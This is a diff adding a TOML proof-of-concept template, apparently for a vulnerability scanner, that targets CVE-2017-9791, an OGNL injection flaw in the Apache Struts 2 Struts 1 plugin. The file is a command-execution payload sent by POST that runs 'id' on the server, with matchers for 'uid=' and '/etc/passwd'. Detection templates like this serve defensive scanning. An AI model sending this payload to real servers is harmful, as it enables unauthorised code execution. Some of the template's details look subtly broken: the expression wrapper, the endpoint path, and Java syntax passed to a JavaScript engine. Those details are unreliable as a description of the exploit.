@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "验证 Apache Struts 2 Struts 1 插件是否存在 OGNL 表达式注入漏洞。通过向特定端点发送包含恶意 OGNL 表达式的字段值，检测服务器是否执行了未经授权的代码或读取了敏感文件。利用 Struts 2 框架对用户输入的恶意字段值处理不当的漏洞，实现远程代码执行或文件读取测试。"
+id = "POC-AVE-2017-1300"
+name = "CVE-2017-9791 Apache Struts 2 Struts 1 插件 OGNL 代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2017-1300"]
+vuln_id = [
+    "CVE-2017-9791",
+    "AVE-2017-1300",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/plugins/servlet/testMethod/create"
+protocol = "http"
+
+[poc.requests.body]
+content = '''!{javax.script.ScriptEngineManager.getEngineByName('javascript').eval('new java.lang.ProcessBuilder(new String[\"id\"]).start().getInputStream().readAllBytes()')}'''
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "root:",
+    "bin/bash",
+    "/etc/passwd",
+]
